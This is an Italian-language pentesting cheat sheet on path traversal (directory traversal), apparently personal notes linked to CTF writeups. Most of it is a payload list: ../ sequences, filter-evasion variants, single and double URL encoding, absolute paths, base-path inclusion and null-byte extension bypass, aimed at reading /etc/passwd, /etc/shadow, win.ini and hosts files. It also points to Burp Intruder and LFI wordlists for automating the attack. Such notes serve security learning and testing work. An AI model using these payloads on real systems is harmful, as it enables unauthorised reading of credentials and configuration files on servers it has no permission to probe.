#Exploit_noti 

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Attacco canonico]]
- [[#Non canonico]]
- [[#URL Encoding e doppio URL encoding]]
- [[#Percorso assoluto]]
- [[#Inclusione della base path]]
- [[#Bypass dellâ€™estensione]]
- [[#Automatizzazione]]

---
---
---
### Introduzione
Il *Path Traversal*, noto anche come Directory Traversal, Ã¨ una vulnerabilitÃ  che consente a un attaccante di accedere a file arbitrari sul file system del server. Questa tecnica puÃ² compromettere codice applicativo, file di configurazione, credenziali e persino lâ€™intero sistema operativo.

> [!ATTENTION]
> **Dove cercare:** testare qualsiasi parametro che recuperi una risorsa interna.
> **Cosa cercare:** file di configurazione; consultare la sezione CMS o google *config file nomecms*.

---
### Attacco canonico

```
../../../../../../../../../etc/passwd`
```

```
/load?file=..\..\..\windows\win.ini
```

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Tabby| Tabby]],[[Linux#Vmdak| Vmdak]],[[Linux#Wallpaper Hub| Wallpaper Hub]],[[Linux#Potato| Potato]],[[Linux#Stapler| Stapler]],[[Linux#Builder| Builder]],
- *Windows:*[[Windows#LFI#Mailing| Mailing]],[[Windows#LFI#DVR4| DVR4]],

---
### Non canonico

```
/load?file=....//....//etc/passwd
/load?file=....\/....\/etc/passwd
```

```
/load?file=....\\windows\\win.ini
/load?file=....//windows//win.ini
```
---
### URL Encoding e doppio URL encoding
Codificare per bypassare i controlli:

```
%2e%2e%2fetc%2fpasswd       â†’ ../etc/passwd
%252e%252e%252fetc%252fpasswd â†’ doppio encoding
```

```
%2e%2e%5cwindows%5cwin.ini       â†’ ..\windows\win.ini
%252e%252e%255cwindows%255cwin.ini â†’ doppio encoding
```

---
### Percorso assoluto
Alcuni filtri possono essere aggirati passando direttamente:

```
filename=/etc/passwd
```

```
filename=C:\Windows\win.ini
```

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Readys| Readys]],

---
### Inclusione della base path
Se il file deve iniziare con una directory specifica:

```
filename=/var/www/images/../../../etc/shadow
```

```
filename=C:\inetpub\wwwroot\images\..\..\..\windows\System32\drivers\etc\hosts
```

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Jarvis| Jarvis]],

---
### Bypass dellâ€™estensione
Uso del **null byte** per troncare il nome del file ed accedere al contenuto della risorsa:

```
filename=../../../etc/passwd%00.png
```

```
filename=..\..\..\windows\win.ini%00.jpg
```

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Beep#Exploit 2| Beep]],

---
### Automatizzazione
Per l'automatizzazione dell'attacco si consiglia l'uso di[[ðŸ”¡ Glossario#Burp Suite| BurpÂ°]], seguendo questa [guida](https://portswigger.net/burp/documentation/desktop/tools/intruder/getting-started). 
Si consigliano le seguenti wordlists:

- [Linux wordlist](https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt) 
- [Windows wordlist](https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_windows.txt)

